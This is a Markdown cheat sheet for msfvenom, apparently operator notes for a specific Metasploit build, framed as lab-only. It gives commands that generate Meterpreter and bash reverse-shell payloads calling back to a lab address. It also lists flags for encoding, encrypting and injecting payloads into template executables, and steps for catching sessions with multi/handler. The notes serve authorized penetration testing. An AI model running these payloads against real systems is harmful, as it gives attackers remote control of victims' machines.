# MSFvenom Workflows

Standalone payload generator (replacement for legacy msfpayload/msfencode). Flags below match **reconstructed OptionParser** for package **6.5.2-20260809060523-1rapid7** (2026-08-10). Full text in operator CLI-Options doc.

## List and inspect

```bash
msfvenom -l payloads
msfvenom -l formats
msfvenom -l encoders
msfvenom -l platforms
msfvenom -l archs
msfvenom -l encrypt
msfvenom -l all
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

`--list` types: `payloads`, `encoders`, `nops`, `platforms`, `archs`, `encrypt`, `formats`, `all`.

## Generate (lab)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o lab_payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o lab.elf
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.1 LPORT=4444 -f raw -o rev.sh
```

Trailing `var=val` pairs set payload datastore (e.g. `LHOST`, `LPORT`).

## Constrained delivery

| Need | Flags |
|------|-------|
| Avoid bad bytes | `-b '\x00\xff'` |
| Encoder | `-e <encoder>` + optional `-i <count>` |
| Max size | `-s <length>` / `--encoder-space` |
| Nopsled | `-n <length>` / `--pad-nops` |
| Template inject | `-x template.exe` (+ `-k` keep thread behaviour) |
| Encrypt shellcode | `--encrypt` / `--encrypt-key` / `--encrypt-iv` |
| Smallest encode pass | `--smallest` |
| Custom from STDIN | `-p -` with `-t` timeout (default 30; `0` disables) |

## Handler pairing

1. Note exact `-p` payload name and `LHOST`/`LPORT`.
2. In msfconsole: `use exploit/multi/handler`.
3. `set PAYLOAD` to the same payload; set matching `LHOST`/`LPORT`.
4. `run -j`; deliver payload only on authorized lab hosts.
5. `sessions -l` / `sessions -i <id>`.

## Safety

- Lab-only by default; treat binaries as malware-like artifacts.
- Encoding/encrypt flags are for constrained exploit delivery — not a SpiderFeet “evasion corpus” goal.
- On this Windows extract, live `msfvenom -h` may raise `Bundler::GemNotFound`; regenerate help via package OptionParser if needed (`emit_help.rb` under `.tmp_msf_help/`).
